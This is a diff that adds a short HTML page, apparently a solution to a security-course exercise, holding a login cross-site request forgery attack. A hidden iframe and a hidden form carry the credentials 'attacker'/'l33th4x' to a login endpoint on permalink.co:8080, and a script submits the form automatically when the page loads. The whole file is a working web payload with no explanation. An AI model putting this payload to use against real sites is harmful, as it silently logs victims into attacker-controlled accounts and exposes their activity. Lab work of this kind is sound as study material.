@@ -1,0 +1,10 @@
+<iframe style="display:none;" src="" name="myiframe"></iframe>
+<form id="f" action="http://permalink.co:8080/login?csrfdefense=0&xssdefense=5" method="POST" visibility="hidden" target="myiframe">
+<input type="hidden" name="username" value="attacker"></input>
+<input type="hidden" name="password" value="l33th4x"></input>
+</form>
+<script>
+document.forms["f"].submit();
+
+</script>
+
